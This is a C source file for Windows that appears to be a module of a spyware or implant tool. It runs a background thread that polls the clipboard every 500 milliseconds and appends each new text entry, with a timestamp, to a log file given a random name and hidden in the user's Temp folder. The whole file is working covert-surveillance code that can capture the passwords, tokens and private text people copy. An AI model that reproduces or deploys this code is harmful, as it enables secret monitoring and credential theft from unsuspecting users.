#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "../include/clipboard.h"
#include "../include/uuid.h"

#define CLIPBOARD_BUFFER_SIZE 4096
#define CLIPBOARD_LOG_BUFFER_SIZE 8192

static char clipboard_log_path[256] = {0};

char* get_clipboard_logpath(void)
{
    if (clipboard_log_path[0] == '\0')
    {
        char *UUID = generate_uuid();
        sprintf(clipboard_log_path, "C:\\Users\\%s\\AppData\\Local\\Temp\\clipboard_%s.txt",
                getenv("USERNAME"), UUID);
    }

    char *result = (char*)malloc(strlen(clipboard_log_path) + 1);
    if (result != NULL)
    {
        strcpy(result, clipboard_log_path);
    }
    return result;
}

char* get_clipboard_contents(void)
{
    char *result = (char*)malloc(CLIPBOARD_BUFFER_SIZE);
    if (result == NULL)
    {
        return NULL;
    }
    memset(result, 0, CLIPBOARD_BUFFER_SIZE);

    // Open clipboard
    if (!OpenClipboard(NULL))
    {
        strcpy(result, "[-] Failed to open clipboard\n");
        return result;
    }

    // Check if text data is available
    if (!IsClipboardFormatAvailable(CF_TEXT))
    {
        CloseClipboard();
        strcpy(result, "[*] Clipboard is empty or contains non-text data\n");
        return result;
    }

    // Get clipboard data
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL)
    {
        CloseClipboard();
        strcpy(result, "[-] Failed to get clipboard data\n");
        return result;
    }

    // Lock and copy data
    char *pszText = (char*)GlobalLock(hData);
    if (pszText != NULL)
    {
        size_t len = strlen(pszText);
        if (len >= CLIPBOARD_BUFFER_SIZE - 1)
        {
            len = CLIPBOARD_BUFFER_SIZE - 2;
        }
        strncpy(result, pszText, len);
        result[len] = '\0';
        GlobalUnlock(hData);
    }
    else
    {
        strcpy(result, "[-] Failed to lock clipboard data\n");
    }

    CloseClipboard();
    return result;
}

static void log_clipboard_change(const char *content)
{
    if (clipboard_log_path[0] == '\0')
    {
        char *UUID = generate_uuid();
        sprintf(clipboard_log_path, "C:\\Users\\%s\\AppData\\Local\\Temp\\clipboard_%s.txt",
                getenv("USERNAME"), UUID);
    }

    FILE *fp = fopen(clipboard_log_path, "a");
    if (fp != NULL)
    {
        // Get current time
        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);

        // Write timestamp and content
        fprintf(fp, "\n[%s]\n%s\n", timestamp, content);
        fprintf(fp, "----------------------------------------\n");
        fclose(fp);
    }
}

DWORD WINAPI clipboard_monitor(LPVOID param)
{
    char last_clipboard[CLIPBOARD_BUFFER_SIZE] = {0};
    char current_clipboard[CLIPBOARD_BUFFER_SIZE] = {0};

    // Initialize log file path
    if (clipboard_log_path[0] == '\0')
    {
        char *UUID = generate_uuid();
        sprintf(clipboard_log_path, "C:\\Users\\%s\\AppData\\Local\\Temp\\clipboard_%s.txt",
                getenv("USERNAME"), UUID);
    }

    // Log start
    FILE *fp = fopen(clipboard_log_path, "w");
    if (fp != NULL)
    {
        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
        fprintf(fp, "=== Clipboard Monitor Started at %s ===\n", timestamp);
        fclose(fp);
    }

    while (1)
    {
        Sleep(500);  // Poll every 500ms

        // Try to open clipboard
        if (!OpenClipboard(NULL))
        {
            continue;
        }

        // Check if text data is available
        if (IsClipboardFormatAvailable(CF_TEXT))
        {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData != NULL)
            {
                char *pszText = (char*)GlobalLock(hData);
                if (pszText != NULL)
                {
                    // Copy to current buffer (with size limit)
                    size_t len = strlen(pszText);
                    if (len >= CLIPBOARD_BUFFER_SIZE - 1)
                    {
                        len = CLIPBOARD_BUFFER_SIZE - 2;
                    }
                    memset(current_clipboard, 0, CLIPBOARD_BUFFER_SIZE);
                    strncpy(current_clipboard, pszText, len);

                    // Check if clipboard content changed
                    if (strcmp(current_clipboard, last_clipboard) != 0)
                    {
                        // Log the new content
                        log_clipboard_change(current_clipboard);

                        // Update last clipboard
                        strcpy(last_clipboard, current_clipboard);
                    }

                    GlobalUnlock(hData);
                }
            }
        }

        CloseClipboard();
    }

    return 0;
}
